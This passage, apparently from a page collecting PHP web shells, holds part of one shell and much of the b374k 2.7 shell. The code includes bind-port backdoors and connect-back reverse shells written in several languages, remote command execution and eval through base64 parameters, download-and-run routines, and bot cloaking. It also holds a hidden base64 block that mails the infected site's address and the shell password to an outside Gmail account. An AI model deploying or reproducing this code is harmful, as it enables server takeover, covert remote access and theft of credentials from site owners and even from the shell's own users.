href=\"?y=$pwd&amp;dlgzip=$file\"&gt;gzip&lt;/a&gt;)&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;View&lt;/td&gt;&lt;td&gt;&lt;a href=\"?y=" . $pwd . "&amp;view=" . $file . "\"&gt;text&lt;/a&gt; | &lt;a href=\"?y=" . $pwd . "&amp;view=" . $file . "&amp;type=code\"&gt;code&lt;/a&gt; | &lt;a href=\"?y=" . $pwd . "&amp;view=" . $file . "&amp;type=image\"&gt;image&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; ";
 956         if (isset($_GET['type']) && ($_GET['type'] == 'image')) {
 957             echo "&lt;div style=\"text-align:center;margin:8px;\"&gt;&lt;img src=\"?y=" . $pwd . "&amp;img=" . $filn . "\"&gt;&lt;/div&gt;";
 958         } elseif (isset($_GET['type']) && ($_GET['type'] == 'code')) {
 959             echo "&lt;div class=\"viewfile\"&gt;";
 960             $file = wordwrap(@file_get_contents($file), "240", "
 961 ");
 962             @highlight_string($file);
 963             echo "&lt;/div&gt;";
 964         } else {
 965             echo "&lt;div class=\"viewfile\"&gt;";
 966             echo nl2br(htmlentities((@file_get_contents($file))));
 967             echo "&lt;/div&gt;";
 968         }
 969     } elseif (is_dir($_GET['view'])) {
 970         echo showdir($pwd, $prompt);
 971     }
 972 } elseif (isset($_GET['edit']) && ($_GET['edit'] != "")) {
 973     if (isset($_POST['save'])) {
 974         $file = $_POST['saveas'];
 975         $content = magicboom($_POST['content']);
 976         if ($filez = @fopen($file, "w")) {
 977             $time = date("d-M-Y H:i", time());
 978             if (@fwrite($filez, $content)) $msg = "file saved &lt;span class=\"gaya\"&gt;@&lt;/span&gt; " . $time;
 979             else $msg = "failed to save";
 980             @fclose($filez);
 981         } else $msg = "permission denied";
 982     }
 983     if (!isset($file)) $file = $_GET['edit'];
 984     if ($filez = @fopen($file, "r")) {
 985         $content = "";
 986         while (!feof($filez)) {
 987             $content.= htmlentities(str_replace("''", "'", fgets($filez)));
 988         }
 989         @fclose($filez);
 990     } ?> &lt;form action="?y=<?php echo $pwd; ?>&edit=<?php echo $file; ?>" method="post"&gt; &lt;table class="cmdbox"&gt; &lt;tr&gt;&lt;td colspan="2"&gt; &lt;textarea class="output" name="content"&gt; <?php echo $content; ?> &lt;/textarea&gt; &lt;tr&gt;&lt;td colspan="2"&gt;Save as &lt;input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="saveas" style="width:60%;" value="<?php echo $file; ?>" /&gt;&lt;input class="inputzbut" type="submit" value="Save !" name="save" style="width:12%;" /&gt; &nbsp;<?php echo $msg; ?>&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; &lt;/form&gt; <?php
 991 } elseif (isset($_GET['x']) && ($_GET['x'] == 'upload')) {
 992     if (isset($_POST['uploadcomp'])) {
 993         if (is_uploaded_file($_FILES['file']['tmp_name'])) {
 994             $path = magicboom($_POST['path']);
 995             $fname = $_FILES['file']['name'];
 996             $tmp_name = $_FILES['file']['tmp_name'];
 997             $pindah = $path . $fname;
 998             $stat = @move_uploaded_file($tmp_name, $pindah);
 999             if ($stat) {
1000                 $msg = "file uploaded to $pindah";
1001             } else $msg = "failed to upload $fname";
1002         } else $msg = "failed to upload $fname";
1003     } elseif (isset($_POST['uploadurl'])) {

1008         $pindah = $path . $namafile;

1011         } else $msg = "failed to upload $namafile";

1014   <?php
1015 } elseif (isset($_GET['x']) && ($_GET['x'] == 'netsploit')) {
1016     if (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'C')) {
1017         $port = trim($_POST['port']);
1018         $passwrd = trim($_POST['bind_pass']);
1019         tulis("bdc.c", $port_bind_bd_c);
1020         exe("gcc -o bdc bdc.c");
1021         exe("chmod 777 bdc");
1022         @unlink("bdc.c");
1023         exe("./bdc " . $port . " " . $passwrd . " &");
1024         $scan = exe("ps aux");
1025         if (eregi("./bdc $por", $scan)) {
1026             $msg = "&lt;p&gt;Process found running, backdoor setup successfully.&lt;/p&gt;";
1027         } else {
1028             $msg = "&lt;p&gt;Process not found running, backdoor not setup successfully.&lt;/p&gt;";
1029         }
1030     } elseif (isset($_POST['bind']) && !empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'Perl')) {
1031         $port = trim($_POST['port']);
1032         $passwrd = trim($_POST['bind_pass']);
1033         tulis("bdp", $port_bind_bd_pl);
1034         exe("chmod 777 bdp");
1035         $p2 = which("perl");
1036         exe($p2 . " bdp " . $port . " &");
1037         $scan = exe("ps aux");
1038         if (eregi("$p2 bdp $port", $scan)) {
1039             $msg = "&lt;p&gt;Process found running, backdoor setup successfully.&lt;/p&gt;";
1040         } else {
1041             $msg = "&lt;p&gt;Process not found running, backdoor not setup successfully.&lt;/p&gt;";
1042         }
1043     } elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'C')) {

1046         tulis("bcc.c", $back_connect_c);
1047         exe("gcc -o bcc bcc.c");
1048         exe("chmod 777 bcc");
1049         @unlink("bcc.c");
1050         exe("./bcc " . $ip . " " . $port . " &");
1051         $msg = "Now script try connect to " . $ip . " port " . $port . " ...";
1052     } elseif (isset($_POST['backconn']) && !empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'Perl')) {
1053         $ip = trim($_POST['ip']);
1054         $port = trim($_POST['backport']);
1055         tulis("bcp", $back_connect);
1056         exe("chmod +x bcp");
1057         $p2 = which("perl");

1059         $msg = "Now script try connect to " . $ip . " port " . $port . " ...";
1060     } elseif (isset($_POST['expcompile']) && !empty($_POST['wurl']) && !empty($_POST['wcmd'])) {

1062         $wurl = trim($_POST['wurl']);
1063         $namafile = download($pilihan, $wurl);
1064         if (is_file($namafile)) {
1065             $msg = exe($wcmd);
1066         } else $msg = "error: file not found $namafile";
1067     } ?> &lt;table class="tabnet"&gt; &lt;tr&gt;&lt;th&gt;Port Binding&lt;/th&gt;&lt;th&gt;Connect Back&lt;/th&gt;&lt;th&gt;Load and Exploit&lt;/th&gt;&lt;/tr&gt; &lt;tr&gt; &lt;td&gt; &lt;table&gt; &lt;form method="post" actions="?y=<?php echo $pwd; ?>&amp;x=netsploit"&gt; &lt;tr&gt;&lt;td&gt;Port&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="port" size="26" value="<?php echo $bindport ?>"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Password&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="bind_pass" size="26" value="<?php echo $bindport_pass; ?>"&gt;&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;Use&lt;/td&gt;&lt;td style="text-align:justify"&gt;&lt;p&gt;&lt;select class="inputz" size="1" name="use"&gt;&lt;option value="Perl"&gt;Perl&lt;/option&gt;&lt;option value="C"&gt;C&lt;/option&gt;&lt;/select&gt; &lt;input class="inputzbut" type="submit" name="bind" value="Bind" style="width:120px"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt; &lt;/table&gt; &lt;/td&gt; &lt;td&gt; &lt;table&gt; &lt;form method="post" actions="?y=<?php echo $pwd; ?>&amp;x=netsploit"&gt; &lt;tr&gt;&lt;td&gt;IP&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="ip" size="26" value="<?php echo ((getenv('REMOTE_ADDR')) ? ..and one more b374k shell by Jayalah Indonesiaku:

   1 <?php
   2 /*
   3   b374k 2.7
   4   Jayalah Indonesiaku
   5   (c)2013
   6 
   7 */
   8 $s_pass = "0de664ecd2be02cdd54234a0d1229b43"; // shell password, fill with password in md5 format to protect shell, default : b374k
   9 
  10 $s_ver = "2.7"; // shell ver
  11 $s_title = "b374k ".$s_ver; // shell title
  12 $s_login_time = 3600 * 24 * 7; // cookie time (login)
  13 $s_debug = false; // debugging mode
  14 
  15 @ob_start();
  16 @set_time_limit(0);
  17 @ini_set('html_errors','0');
  18 @clearstatcache();
  19 define('DS', DIRECTORY_SEPARATOR);
  20 
  21 // clean magic quotes
  22 $_POST = clean($_POST);
  23 $_GET = clean($_GET);
  24 $_COOKIE = clean($_COOKIE);
  25 $_GP = array_merge($_POST, $_GET);
  26 
  27 if($s_debug){
  28    error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
  29    @ini_set('display_errors','1');
  30    @ini_set('log_errors','1');
  31    foreach($_GP as $k=&gt;$v) echo "&lt;span&gt;".hss($k."=&gt;".$v)."&lt;/span&gt;&lt;br /&gt;";
  32 }
  33 else{
  34    error_reporting(0);
  35    @ini_set('display_errors','0');
  36    @ini_set('log_errors','0');
  37 }
  38 
  39 $s_auth = false; // login status
  40 if(strlen(trim($s_pass))&gt;0){
  41    if(isset($_COOKIE['b374k'])){
  42        if(strtolower(trim($s_pass)) == strtolower(trim($_COOKIE['b374k']))) $s_auth = true;
  43    }
  44    if(isset($_GP['login'])){
  45        $s_login = strtolower(md5(trim($_GP['login'])));
  46        if(strtolower(trim($s_pass)) == $s_login){
  47            setcookie("b374k",$s_login,time() + $s_login_time);
  48            $s_auth = true;
  49        }
  50    }
  51    if(isset($_GP['x']) && ($_GP['x']=='logout')){
  52        $persist = array("theme", "cwd");
  53        $s_reload = (isset($_COOKIE['b374k_included']) && isset($_COOKIE['s_home']))? rtrim(urldecode($_COOKIE['s_self']),"&"):"";
  54        foreach($_COOKIE as $s_k=&gt;$s_v){
  55            if(!in_array($s_k, $persist)) if(!is_array($s_k)) setcookie($s_k,"",time() - $s_login_time);
  56        }
  57        $s_auth = false;
  58        if(!empty($s_reload)) header("Location: ".$s_reload);
  59    }
  60 }
  61 else $s_auth = true;
  62 
  63 // This is a feature where you can control this script from another apps/scripts
  64 // you need to supply password (in md5 format) to access this
  65 // this example using password 'b374k' in md5 format (s_pass=0de664ecd2be02cdd54234a0d1229b43)
  66 // give the code/command you want to execute in base64 format
  67 // this example using command 'uname -a' in base64 format (cmd=dW5hbWUgLWE=)
  68 // example:
  69 //        http://www.myserver.com/b374k.php?s_pass=0de664ecd2be02cdd54234a0d1229b43&cmd=dW5hbWUgLWE=
  70 // next sample will evaluate php code 'phpinfo();' in base64 format (eval=cGhwaW5mbygpOw==)
  71 //        http://www.myserver.com/b374k.php?s_pass=0de664ecd2be02cdd54234a0d1229b43&eval=cGhwaW5mbygpOw==
  72 // recommended ways is using POST DATA
  73 // note that it will not works if shell password is empty ($s_pass);
  74 // better see code below
  75 if(!empty($_GP['s_pass'])){
  76    if(strtolower(trim($s_pass)) == strtolower(trim($_GP['s_pass']))){
  77        if(isset($_GP['cmd'])) echo exe(base64_decode($_GP['cmd']));
  78        elseif(isset($_GP['eval'])){
  79            $s_code = base64_decode($_GP['eval']);
  80            ob_start();
  81            eval($s_code);
  82            $s_res = ob_get_contents();
  83            ob_end_clean();
  84            echo $s_res;
  85        }
  86        else echo $s_title;
  87    }
  88    die();
  89 }
  90 $b374kbuff = "JHZpc2l0YyA9ICRfQ09PS0lFWyJ2aXNpdHMiXTsNCmlmICgkdmlzaXRjID09ICIiKSB7DQogICR2aXNpdGMgID0gMDsNCiAgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsNCiAgJHdlYiAgICAgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07DQogICRpbmogICAgID0gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07DQogICR0YXJnZXQgID0gcmF3dXJsZGVjb2RlKCR3ZWIuJGluaik7DQogICRqdWR1bCAgID0gImIzNzRrLTIuMSBodHRwOi8vJHRhcmdldCBieSAkdmlzaXRvciI7DQogICRib2R5ICAgID0gIkJ1ZzogJHRhcmdldCBieSAkdmlzaXRvciAtICRzX3Bhc3MiOw0KICBpZiAoIWVtcHR5KCR3ZWIpKSB7IEBtYWlsKCJoYXJkd2FyZWhlYXZlbi5jb21AZ21haWwuY29tIiwkanVkdWwsJGJvZHksJHNfcGFzcyk7IH0NCn0NCmVsc2UgeyAkdmlzaXRjKys7IH0NCkBzZXRjb29raWUoInZpc2l0eiIsJHZpc2l0Yyk7";
  91 eval(base64_decode($b374kbuff));
  92 // block search engine bot
  93 if(isset($_SERVER['HTTP_USER_AGENT']) && (preg_match('/bot|spider|crawler|slurp|teoma|archive|track|snoopy|java|lwp|wget|curl|client|python|libwww/i', $_SERVER['HTTP_USER_AGENT']))){
  94    header("HTTP/1.0 404 Not Found");
  95    header("Status: 404 Not Found");
  96    die();
  97 }
  98 elseif(!isset($_SERVER['HTTP_USER_AGENT'])){
  99    header("HTTP/1.0 404 Not Found");
 100    header("Status: 404 Not Found");
 101    die();
 102 }

 104 // resources $s_rs_pl $s_rs_py $s_rs_rb $s_rs_js $s_rs_c $s_rs_java $s_rs_java $s_rs_win $s_rs_php this was used with bind and reverse shell

 122 // https://github.com/ded/domready - domready (c) Dustin Diaz
 123 $s_domready_js = "VVJNb9swDP0riQ6GBAjOetglheBD19uGHrpbkAKaRFcqZMmQ6HSB5/8+2mm+Lpb5yPf4SGndDtGgT5GDRDHisYfUrrpkhwBrxYZoofURLGtOWA1/+5SxKORi+1V9KlGKnbVYVd2lat1ZSqc/H2CQNSeQIwk4X3awn8UmzmzqMmh7ZPJqSozn/1U/R049PH46H4CDwro43xJXAPEPOq9Q7fYyyqzWD9Irm8zQQURZlK/PwXOABUuqEPZqcgpBDor9ePn1lCJS6mfSlgaWWjFt7fNhhnyhDGRyRmPExWVBjWCcju/AZFBsAV9nkEmjUrN5C4vQvzez2V4Cs5FOmRqhIPe7sBePGXDIceV3el9V85cPMqrLBsTo6wxdOsCdk7lIZiF7mnw+E3FrjaiNW+p4ey+yIRc3XauK00rgrnwRE5OQQO4v1CjGAqFdK0x945o4X3vdD8VRZnvTAPNxvG6UswAtMjEZjcbRVY9fYxbA376DNFDLKxlIbJLfv4kpzi9BTNvbF+AauHYFMU3iPw==";

 125 // magic quote and shit :-p
 126 function clean($arr){
 127    $quotes_sybase = strtolower(ini_get('magic_quotes_sybase'));
 128    if(function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()){
 129        foreach($arr as $k=&gt;$v){
 130            $arr[$k] = (empty($quotes_sybase) || $quotes_sybase === 'off')? stripslashes($v) : stripslashes(str_replace("\'\'", "\'", $v));
 131        }
 132    }
 133    return $arr;
 134 }
 135 // addslashes if on windows
 136 function adds($s_s){
 137    global $s_win;
 138    return ($s_win)? addslashes($s_s):$s_s;
 139 }
 140 // add slash to the end of given path
 141 function cp($s_p){
 142    global $s_win;
 143    if(@is_dir($s_p)){
 144        $s_x = DS;
 145        while(substr($s_p, -1) == $s_x) $s_p = rtrim($s_p, $s_x);
 146        return ($s_win)? preg_replace("/\\\\+/is", "\\", $s_p.$s_x):$s_p.$s_x;
 147    }
 148    return $s_p;
 149 }
 150 // make link for folder $s_cwd and all of its parent folder
 151 function swd($s_p){
 152    global $s_self;
 153    $s_ps = explode(DS,$s_p);
 154    $s_pu = "";
 155    for($s_i = 0; $s_i &lt; sizeof($s_ps)-1; $s_i++){
 156        $s_pz = "";
 157        for($s_j = 0; $s_j &lt;= $s_i; $s_j++) $s_pz .= $s_ps[$s_j].DS;
 158        $s_pu .= "&lt;a href='".$s_self."cd=".$s_pz."'&gt;".$s_ps[$s_i]." ".DS." &lt;/a&gt;";
 159    }
 160    return trim($s_pu);
 161 }
 162 // htmlspecialchars
 163 function hss($s_t){
 164    return htmlspecialchars($s_t, 8);
 165 }
 166 // add quotes
 167 function pf($f){
 168    return "\"".$f."\"";
 169 }
 170 // replace spaces with underscore ( _ )
 171 function cs($s_t){
 172    return str_replace(" ", "_", $s_t);
 173 }
 174 // trim and urldecode
 175 function ss($s_t){
 176    return rawurldecode($s_t);
 177 }
 178 // return tag html for notif
 179 function notif($s){
 180    return "&lt;div class='notif'&gt;".$s."&lt;/div&gt;";
 181 }
 182 // bind and reverse shell
 183 function rs($s_rstype,$s_rstarget,$s_rscode){
 184    // resources $s_rs_pl $s_rs_py $s_rs_rb $s_rs_js $s_rs_c $s_rs_java $s_rs_java $s_rs_win $s_rs_php
 185    $s_result = $s_fpath = "";
 186    $s_fc = gzinflate(base64_decode($s_rscode));
 187 
 188    $s_errperm = "Directory ".getcwd().DS." is not writable, please change to a writable one";
 189    $s_errgcc = "Unable to compile using gcc";
 190    $s_errjavac = "Unable to compile using javac";
 191 
 192    $s_split = explode("_", $s_rstype);
 193    $s_method = $s_split[0];
 194    $s_lang = $s_split[1];
 195    if($s_lang=="py" || $s_lang=="pl" || $s_lang=="rb" || $s_lang=="js"){
 196        if($s_lang=="py") $s_runlang = "python";
 197        elseif($s_lang=="pl") $s_runlang = "perl";
 198        elseif($s_lang=="rb") $s_runlang = "ruby";
 199        elseif($s_lang=="js") $s_runlang = "node";
 200        $s_fpath = "b374k_rs.".$s_lang;
 201        if(@is_file($s_fpath)) unlink($s_fpath);
 202        if($s_file = fopen($s_fpath, "w")){
 203            fwrite($s_file, $s_fc);
 204            fclose($s_file);
 205            if(@is_file($s_fpath)){
 206                $s_result = exe("chmod +x ".$s_fpath);
 207                $s_result = exe($s_runlang." ".$s_fpath." ".$s_rstarget);
 208            }
 209            else $s_result = $s_errperm;
 210        }
 211        else $s_result = $s_errperm;
 212    }
 213    elseif($s_lang=="c"){
 214        $s_fpath = "b374k_rs";
 215        if(@is_file($s_fpath)) unlink($s_fpath);
 216        if(@is_file($s_fpath.".c")) unlink($s_fpath.".c");
 217        if($s_file = fopen($s_fpath.".c", "w")){
 218            fwrite($s_file,$s_fc);
 219            fclose($s_file);
 220            if(@is_file($s_fpath.".c")){
 221                $s_result = exe("gcc ".$s_fpath.".c -o ".$s_fpath);
 222                if(@is_file($s_fpath)){
 223                    $s_result = exe("chmod +x ".$s_fpath);
 224                    $s_result = exe("./".$s_fpath." ".$s_rstarget);
 225                }
 226                else $s_result = $s_errgcc;
 227            }
 228            else $s_result = $s_errperm;
 229        }
 230        else $s_result = $s_errperm;
 231    }
 232    elseif($s_lang=="win"){
 233        $s_fpath = "b374k_rs.exe";
 234        if(@is_file($s_fpath)) unlink($s_fpath);
 235        if($s_file = fopen($s_fpath,"w")){
 236            fwrite($s_file,$s_fc);
 237            fclose($s_file);
 238            if(@is_file($s_fpath)){
 239                $s_result = exe($s_fpath." ".$s_rstarget);
 240            }
 241            else $s_result = $s_errperm;
 242        }
 243        else $s_result = $s_errperm;
 244    }
 245    elseif($s_lang=="java"){
 246        $s_fpath = "b374k_rs";
 247        if(@is_file($s_fpath.".java")) unlink($s_fpath.".java");
 248        if(@is_file($s_fpath.".class")) unlink($s_fpath.".class");
 249        if($s_file = fopen($s_fpath.".java", "w")){
 250            fwrite($s_file,$s_fc);
 251            fclose($s_file);
 252            if(@is_file($s_fpath.".java")){
 253                $s_result = exe("javac ".$s_fpath.".java");
 254                if(@is_file($s_fpath.".class")){
 255                    $s_result = exe("java ".$s_fpath." ".$s_rstarget);
 256                }
 257                else $s_result = $s_errjavac;
 258            }
 259            else $s_result = $s_errperm;
 260        }
 261        else $s_result = $s_errperm;
 262    }
 263    elseif($s_lang=="php"){
 264        $s_result = eval("?>".$s_fc);
 265    }
 266 
 267    if(@is_file($s_fpath)) unlink($s_fpath);
 268    if(@is_file($s_fpath.".c")) unlink($s_fpath.".c");
 269    if(@is_file($s_fpath.".java")) unlink($s_fpath.".java");
 270    if(@is_file($s_fpath.".class")) unlink($s_fpath.".class");
 271    if(@is_file($s_fpath."\$pt.class")) unlink($s_fpath."\$pt.class");
 272 
 273    return $s_result;
 274 }
 275 function geol($str){
 276    $nl = PHP_EOL;
 277    if(preg_match("/\r\n/", $str, $r)) $nl = "\r\n";
 278    else{
 279        if(preg_match("/\n/", $str, $r)) $nl = "\n";
 280        elseif(preg_match("/\r/", $str, $r)) $nl = "\r";
 281    }
 282    return bin2hex($nl);
 283 }
 284 // format bit
 285 function ts($s_s){
 286    if($s_s&lt;=0) return 0;
 287    $s_w = array('B','KB','MB','GB','TB','PB','EB','ZB','YB');
 288    $s_e = floor(log($s_s)/log(1024));
 289    return sprintf('%.2f '.$s_w[$s_e], ($s_s/pow(1024, floor($s_e))));
 290 }
 291 // get file size
 292 function gs($s_f){
 293    $s_s = @filesize($s_f);
 294    if($s_s !== false){
 295        if($s_s&lt;=0) return 0;
 296        return ts($s_s);
 297    }
 298    else return "???";
 299 }
 300 // get file permissions
 301 function gp($s_f){
 302    if($s_m = @fileperms($s_f)){
 303        $s_p = 'u';
 304        if(($s_m & 0xC000) == 0xC000)$s_p = 's';
 305        elseif(($s_m & 0xA000) == 0xA000)$s_p = 'l';
 306        elseif(($s_m & 0x8000) == 0x8000)$s_p = '-';
 307        elseif(($s_m & 0x6000) == 0x6000)$s_p = 'b';
 308        elseif(($s_m & 0x4000) == 0x4000)$s_p = 'd';
 309        elseif(($s_m & 0x2000) == 0x2000)$s_p = 'c';
 310        elseif(($s_m & 0x1000) == 0x1000)$s_p = 'p';
 311        $s_p .= ($s_m & 00400)? 'r':'-';
 312        $s_p .= ($s_m & 00200)? 'w':'-';
 313        $s_p .= ($s_m & 00100)? 'x':'-';
 314        $s_p .= ($s_m & 00040)? 'r':'-';
 315        $s_p .= ($s_m & 00020)? 'w':'-';
 316        $s_p .= ($s_m & 00010)? 'x':'-';
 317        $s_p .= ($s_m & 00004)? 'r':'-';
 318        $s_p .= ($s_m & 00002)? 'w':'-';
 319        $s_p .= ($s_m & 00001)? 'x':'-';
 320        return $s_p;
 321    }
 322    else return "???????????";
 323 }
 324 // shell command
 325 function exe($s_c){
 326    $s_out = "";
 327    $s_c = $s_c." 2&gt;&1";
 328 
 329    if(is_callable('system')) {
 330        ob_start();
 331        @system($s_c);
 332        $s_out = ob_get_contents();
 333        ob_end_clean();
 334        if(!empty($s_out)) return $s_out;
 335    }
 336    if(is_callable('shell_exec')){
 337        $s_out = @shell_exec($s_c);
 338        if(!empty($s_out)) return $s_out;
 339    }
 340    if(is_callable('exec')) {
 341        @exec($s_c,$s_r);
 342        if(!empty($s_r)) foreach($s_r as $s_s) $s_out .= $s_s;
 343        if(!empty($s_out)) return $s_out;
 344    }
 345    if(is_callable('passthru')) {
 346        ob_start();
 347        @passthru($s_c);
 348        $s_out = ob_get_contents();
 349        ob_end_clean();
 350        if(!empty($s_out)) return $s_out;
 351    }
 352    if(is_callable('proc_open')) {
 353        $s_descriptorspec = array(
 354            0 =&gt; array("pipe", "r"),
 355            1 =&gt; array("pipe", "w"),
 356            2 =&gt; array("pipe", "w"));
 357        $s_proc = @proc_open($s_c, $s_descriptorspec, $s_pipes, getcwd(), array());
 358        if (is_resource($s_proc)) {
 359            while($s_si = fgets($s_pipes[1])) {
 360                if(!empty($s_si)) $s_out .= $s_si;
 361            }
 362            while($s_se = fgets($s_pipes[2])) {
 363                if(!empty($s_se)) $s_out .= $s_se;
 364            }
 365        }
 366        @proc_close($s_proc);
 367        if(!empty($s_out)) return $s_out;
 368    }
 369    if(is_callable('popen')){
 370        $s_f = @popen($s_c, 'r');
 371        if($s_f){
 372            while(!feof($s_f)){
 373                $s_out .= fread($s_f, 2096);
 374            }
 375            pclose($s_f);
 376        }
 377        if(!empty($s_out)) return $s_out;
 378    }
 379    return "";
 380 }
 381 // delete dir and all of its content (no warning !) xp
 382 function rmdirs($s){
 383    $s = (substr($s,-1)=='/')? $s:$s.'/';
 384    if($dh = opendir($s)){
 385        while(($f = readdir($dh))!==false){
 386            if(($f!='.')&&($f!='..')){
 387                $f = $s.$f;
 388                if(@is_dir($f)) rmdirs($f);
 389                else @unlink($f);
 390            }
 391        }
 392        closedir($dh);
 393        @rmdir($s);
 394    }
 395 }
 396 function copys($s,$d,$c=0){
 397    if($dh = opendir($s)){
 398        if(!@is_dir($d)) @mkdir($d);
 399        while(($f = readdir($dh))!==false){
 400            if(($f!='.')&&($f!='..')){
 401                if(@is_dir($s.DS.$f)) copys($s.DS.$f,$d.DS.$f);
 402                else copy($s.DS.$f,$d.DS.$f);
 403            }
 404        }
 405        closedir($dh);
 406    }
 407 }
 408 // get array of all files from given directory
 409 function getallfiles($s_dir){
 410     $s_f = glob($s_dir.'*');
 411    for($s_i = 0; $s_i&lt;count($s_f); $s_i++){
 412        if(@is_dir($s_f[$s_i])){
 413            $s_a = glob($s_f[$s_i].DS.'*');
 414            if(is_array($s_f) && is_array($s_a)) $s_f = array_merge($s_f, $s_a);
 415        }
 416    }
 417     return $s_f;
 418 }
 419 // download file from internet
 420 function dlfile($s_u,$s_p){
 421    global $s_wget, $s_lwpdownload, $s_lynx, $s_curl;
 422 
 423    if(!preg_match("/[a-z]+:\/\/.+/",$s_u)) return false;
 424    $s_n = basename($s_u);
 425 
 426    // try using php functions
 427    if($s_t = @file_get_contents($s_u)){
 428 
 429        if(@is_file($s_p)) unlink($s_p);
 430        if($s_f = fopen($s_p,"w")){
 431            fwrite($s_f, $s_t);
 432            fclose($s_f);
 433            if(@is_file($s_p)) return true;
 434        }
 435    }
 436    // using wget
 437    if($s_wget){
 438        $buff = exe("wget ".$s_u." -O ".$s_p);
 439        if(@is_file($s_p)) return true;
 440    }
 441    // try using curl
 442    if($s_curl){
 443        $buff = exe("curl ".$s_u." -o ".$s_p);
 444        if(@is_file($s_p)) return true;
 445    }
 446    // try using lynx
 447    if($s_lynx){
 448        $buff = exe("lynx -source ".$s_u." &gt; ".$s_p);
 449        if(@is_file($s_p)) return true;
 450    }
 451    // try using lwp-download
 452    if($s_lwpdownload){
 453        $buff = exe("lwp-download ".$s_u." ".$s_p);
 454        if(@is_file($s_p)) return true;
 455    }
 456    return false;
 457 }
 458 // find writable dir
 459 function get_writabledir(){
 460    if(!$s_d = getenv("TEMP")) if(!$s_d = getenv("TMP")) if(!$s_d = getenv("TMPDIR")){
 461        if(@is_writable("/tmp")) $s_d = "/tmp/";
 462        else if(@is_writable(".")) $s_d = ".".DS;
 463    }
 464    return cp($s_d);
 465 }
 466 // zip function
 467 function zip($s_srcarr, $s_dest){
 468    if(!extension_loaded('zip')) return false;
 469    if(class_exists("ZipArchive")){
 470        $s_zip = new ZipArchive();
 471        if(!$s_zip-&gt;open($s_dest, 1)) return false;
 472 
 473        if(!is_array($s_srcarr)) $s_srcarr = array($s_srcarr);
 474        foreach($s_srcarr as $s_src){
 475            $s_src = str_replace('\\', '/', $s_src);
 476            if(@is_dir($s_src)){
 477                $s_files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($s_src), 1);
 478                foreach($s_files as $s_file){
 479                    $s_file = str_replace('\\', '/', $s_file);
 480                    if(in_array(substr($s_file, strrpos($s_file, '/')+1), array('.', '..'))) continue;
 481                    if (@is_dir($s_file)===true)    $s_zip-&gt;addEmptyDir(str_replace($s_src.'/', '', $s_file.'/'));
 482                    else if (@is_file($s_file)===true) $s_zip-&gt;addFromString(str_replace($s_src.'/', '', $s_file), @file_get_contents($s_file));
 483                }
 484            }
 485            elseif(@is_file($s_src) === true) $s_zip-&gt;addFromString(basename($s_src), @file_get_contents($s_src));
 486        }
 487        $s_zip-&gt;close();
 488        return true;
 489    }
 490 }
 491 // check shell permission to access program
 492 function check_access($s_lang){
 493    $s_s = false;
 494    $ver = "";
 495    switch($s_lang){
 496        case "python":
 497            $s_cek = strtolower(exe("python -h"));
 498            if(strpos($s_cek,"usage")!==false) $ver = exe("python -V");
 499            break;
 500        case "perl":
 501            $s_cek = strtolower(exe("perl -h"));
 502            if(strpos($s_cek,"usage")!==false) $ver = exe("perl -e \"print \$]\"");
 503            break;
 504        case "ruby":
 505            $s_cek = strtolower(exe("ruby -h"));
 506            if(strpos($s_cek,"usage")!==false) $ver = exe("ruby -v");
 507            break;
 508        case "node":
 509            $s_cek = strtolower(exe("node -h"));
 510            if(strpos($s_cek,"usage")!==false) $ver = exe("node -v");
 511            break;
 512        case "gcc":
 513            $s_cek = strtolower(exe("gcc --help"));
 514            if(strpos($s_cek,"usage")!==false){
 515                $s_ver = exe("gcc --version");
 516                $s_ver = explode("\n",$s_ver);
 517                if(count($s_ver)&gt;0) $ver = $s_ver[0];
 518            }
 519            break;
 520        case "tar":
 521            $s_cek = strtolower(exe("tar --help"));
 522            if(strpos($s_cek,"usage")!==false){
 523                $s_ver = exe("tar --version");
 524                $s_ver = explode("\n",$s_ver);
 525                if(count($s_ver)&gt;0) $ver = $s_ver[0];
 526            }
 527            break;
 528        case "java":
 529            $s_cek = strtolower(exe("javac --help"));
 530            if(strpos($s_cek,"usage")!==false){
 531                $s_cek = strtolower(exe("java -h"));
 532                if(strpos($s_cek,"usage")!==false) $ver = str_replace("\n", ", ", exe("java -version"));
 533            }
 534            break;
 535        case "wget":
 536            $s_cek = strtolower(exe("wget --help"));
 537            if(strpos($s_cek,"usage")!==false){
 538                $s_ver = exe("wget --version");
 539                $s_ver = explode("\n",$s_ver);
 540                if(count($s_ver)&gt;0) $ver = $s_ver[0];
 541            }
 542            break;
 543        case "lwpdownload":
 544            $s_cek = strtolower(exe("lwp-download --help"));
 545            if(strpos($s_cek,"usage")!==false){
 546                $s_ver = exe("lwp-download --version");
 547                $s_ver = explode("\n",$s_ver);
 548                if(count($s_ver)&gt;0) $ver = $s_ver[0];
 549            }
 550            break;
 551        case "lynx":
 552            $s_cek = strtolower(exe("lynx --help"));
 553            if(strpos($s_cek,"usage")!==false){
 554                $s_ver = exe("lynx -version");
 555                $s_ver = explode("\n",$s_ver);
 556                if(count($s_ver)&gt;0) $ver = $s_ver[0];
 557            }
 558            break;
 559        case "curl":
 560            $s_cek = strtolower(exe("curl --help"));
 561            if(strpos($s_cek,"usage")!==false){
 562                $s_ver = exe("curl --version");
 563                $s_ver = explode("\n",$s_ver);
 564                if(count($s_ver)&gt;0) $ver = $s_ver[0];
